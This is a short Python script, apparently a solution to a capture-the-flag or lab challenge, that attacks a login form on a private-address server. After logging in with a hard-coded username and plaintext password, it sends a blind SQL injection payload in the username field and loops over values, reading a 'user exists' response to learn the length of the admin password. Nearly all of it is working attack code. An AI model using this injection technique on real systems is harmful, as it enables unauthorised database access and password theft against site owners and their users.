import urllib
import urllib2
import requests
import sys
url = 'https://172.27.20.32:8443/login.php'
values = {'username': 'sumedh',
          'password': 'CXbXPGbNfXNvBEL'}

session = requests.session()
r = session.post(url, data=values, verify=False)
#print r.content

url = 'https://172.27.20.32:8443/chal9.php'
for i in range(40):
	print "Trying ", i
	values = {'username' : 'admin" AND length(password)=' + str(i) + ' AND username="admin'}
	r = session.post(url, data=values, verify = False)
	if r.content.find("<script>alert('This user exists.')</script>") == 0:
		print "Length of the password is " + str(i)
		sys.exit(0)



